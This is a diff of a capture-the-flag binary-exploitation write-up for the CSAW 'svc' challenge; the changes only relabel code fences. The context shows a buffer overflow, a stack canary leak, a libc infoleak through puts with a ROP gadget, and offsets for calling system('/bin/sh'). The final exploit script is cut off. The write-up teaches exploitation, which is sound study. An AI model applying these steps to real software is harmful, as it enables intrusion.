@@ -3,7 +3,7 @@
 This was solved on Ubuntu 16.04 with libc version `libc-2.23.so`.
 
 Let's take a look at the binary:
-```
+```console
 $ file svc 
 svc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=8585d22b995d2e1ab76bd520f7826370df71e0b6, stripped
 $ pwn checksec svc 
@@ -56,7 +56,7 @@ $ ./svc
 
 So we can see that it is a `64` bit dynamically linked binary, with a stack canary and a non-executable stack. When we run it it gives us three options. We can input data, print the data, and exit. Looking through the various functions in Ghidra, we can see that the `FUN_00400a9` function holds the menu we are prompted with (also we can see that the code was written in C++):
 
-```
+```c
 
 undefined8 menu(void)
 
@@ -170,13 +170,13 @@ undefined8 menu(void)
 
 Looking through it, we see that this menu runs in a while true loop:
 
-```
+```c
   while (bVar2) {
     this = operator<<<std--char_traits<char>>((basic_ostream *)cout,"-------------------------");
 ```
 
 For each iteration of the loop, we see that it prompts us for a menu option:
-```
+```c
     operator<<<std--char_traits<char>>((basic_ostream *)cout,">>");
     operator>>((basic_istream<char,std--char_traits<char>> *)cin,&menuChoice);
     if (menuChoice == 2) {
@@ -184,14 +184,14 @@ For each iteration of the loop, we see that it prompts us for a menu option:
 
 For the option to scan in data (option `1`) we see that it uses `read` to scan in `0xf8` bytes of data into `input`. Since `input` is a `168` (`0xa8`) byte char array, this option gives us a buffer overflow. The extra space is more than enough to overwrite the return address:
 
-```
+```c
           operator<<<std--char_traits<char>>((basic_ostream *)cout,">>");
           read(0,input,0xf8);
 ```
 
 Looking at the contents of the memory after we feed it the string `15935728`, we can see there are `0xb8` bytes between the start of our input and the return address (this breakpoint is for right after the read call):
 
-```
+```gdb
 Breakpoint 1, 0x0000000000400cd3 in ?? ()
 gef➤  i f
 Stack level 0, frame at 0x7fffffffded0:
@@ -209,20 +209,20 @@ gef➤  search-pattern 15935728
 
 A bit of python math:
 
-```
+```pycon
 >>> hex(0x7fffffffdec8 - 0x7fffffffde10)
 '0xb8'
 ```
 
 For the option `2` to show the input, we see that it just prints `input` with the `puts` function:
 
-```
+```c
       puts(input);
 ```
 
 Finally with option `3`, we see it essentially just exits the loop and returns by setting `bVar2` to false. We will need to send this option to get the code to return, so we can get code execution with the buffer overflow:
 
-```
+```c
     else {
       if (menuChoice == 3) {
         bVar2 = false;
@@ -239,7 +239,7 @@ In order to bypass this, we will need to leak the stack canary. That way we can 
 
 In order to leak the canary we will need to send `0xa9` bytes worth of data. The first `0xa8` will be to fill up the `input` char array, and the last byte will be to overwrite the least significant byte of the stack canary. Let's take a look at the memory for a bit more detail:
 
-```
+```gdb
 gef➤  x/24g 0x7ffe80d6b4e0
 0x7ffe80d6b4e0: 0x3832373533393531  0x00007fa279a33628
 0x7ffe80d6b4f0: 0x0000000000400930  0x00007fa279686489
@@ -257,7 +257,7 @@ gef➤  x/24g 0x7ffe80d6b4e0
 
 here we can see our input `15935728` starts at `0x7ffe80d6b4e0`. `0xa8` bytes down the stack we can see the stack canary `0x05345bfe35ee0700` at `0x7ffe80d6b588` followed by the saved base pointer and return address. After the overflow this is what the memory looks like:
 
-```
+```gdb
 gef➤  x/24g 0x7ffe80d6b4e0
 0x7ffe80d6b4e0: 0x3030303030303030  0x3030303030303030
 0x7ffe80d6b4f0: 0x3030303030303030  0x3030303030303030
@@ -279,7 +279,7 @@ The next step will be to defeat ASLR. ASLR is a mitigation that will essential r
 
 
 Let's take a look at all of the different memory regions in gdb with the `vmmap` command while the program is running:
-```
+```gdb
 gef➤  vmmap
 Start              End                Offset             Perm Path
 0x0000000000400000 0x0000000000402000 0x0000000000000000 r-x /Hackery/csaw/svc
@@ -317,7 +317,7 @@ So we can see all of the memory regions here. The memory region I am going to br
 
 Also a quick tangent, pie (position independent executable) essentially means there is ASLR for addresses in the elf. For this binary that would include these regions. If this was enabled and we wanted to do what we are doing with the `puts` infoleak, we would need another infoleak in this region:
 
-```
+```text
 0x0000000000400000 0x0000000000402000 0x0000000000000000 r-x /Hackery/course/content/ctf_course/modules/bof_dynamic/csawquals17_svc/svc
 0x0000000000601000 0x0000000000602000 0x0000000000001000 r-- /Hackery/course/content/ctf_course/modules/bof_dynamic/csawquals17_svc/svc
 0x0000000000602000 0x0000000000603000 0x0000000000002000 rw- /Hackery/course/content/ctf_course/modules/bof_dynamic/csawquals17_svc/svc
@@ -325,7 +325,7 @@ Also a quick tangent, pie (position independent executable) essentially means th
 
 To do this infoleak, we will need three things. The plt address of `puts` (address of the imported function which we will use to call it), the address of the got entry of `puts` (holds the libc address), and a rop gadget to pop the got entry into the `rdi` register, and then return. Since `puts` expects it's input (a single char pointer) in the `rdi` register, that is where we need to place it. To find the `plt` and `got` addresses, we can just use pwntools:
 
-```
+```pycon
 $ python
 Python 2.7.15rc1 (default, Nov 12 2018, 14:31:15) 
 [GCC 7.3.0] on linux2
@@ -346,7 +346,7 @@ got address: 0x602018
 
 To find the rop gadget we need, we can use a ROP gadget finding utility called ROPGadget (https://github.com/JonathanSalwan/ROPgadget):
 
-```
+```console
 $ python ROPgadget.py --binary svc | grep "pop rdi"
 0x0000000000400ea3 : pop rdi ; ret
 ```
@@ -355,7 +355,7 @@ The last mitigation we will overcome is the Non-Executable Stack. This essential
 
 One more thing, since our exploit relies off of the libc memory region, the version of libc running will make a bit of a difference with the exploit's offsets. It isn't anything too big, but you will need to make a few changes. If you are running a different libc version than what I am, your offsets here should be different. To see what libc version you are running, you can use the `vmmap` command:
 
-```
+```gdb
 gef➤  vmmap
 Start              End                Offset             Perm Path
 0x0000000000400000 0x0000000000402000 0x0000000000000000 r-x /Hackery/csaw/svc
@@ -391,7 +391,7 @@ Start              End                Offset             Perm Path
 
 Here we can see that the libc file is `/lib/x86_64-linux-gnu/libc-2.23.so`. Now there are three offsets we need to find from the base of libc. Those are for `system`, `puts` (we will subtract this offset from the libc puts address to get it's base), and the string `/bin/sh`. We can do that by hand with a bit. First grab the addresses of the things we need in memory:
 
-```
+```gdb
 gef➤  p puts
 $1 = {<text variable, no debug info>} 0x7ffff76fa690 <_IO_puts>
 gef➤  p system
@@ -403,7 +403,7 @@ gef➤  search-pattern /bin/sh
 ```
 
 Then subtract the base address of the memory region from the addresses to get the offset:
-```
+```pycon
 >>> hex(0x7ffff76fa690 - 0x00007ffff768b000)
 '0x6f690'
 >>> hex(0x7ffff76d0390 - 0x00007ffff768b000)
@@ -415,7 +415,7 @@ Then subtract the base address of the memory region from the addresses to get th
 One last thing I need to say about this exploit. I mentioned earlier that our strategy is to first leak the stack canary, then overflow the return address with a simple ROP chain that will give us a libc infoleak, then loop back around to the start of menu so we can re-exploit the bug with a libc infoleak. When we re-exploit it a second time, we will use the libc infoleak to just call `system` with the argument `/bin/sh` (both in the libc) to give us a shell. The particular address we will loop back to will be `0x400a96` (the start of `menu`), sometimes it's a bit more tricky than that but not now.
 
 Putting it all together, we get the following exploit:
-```
+```python
 # Import pwntools
 from pwn import *
 
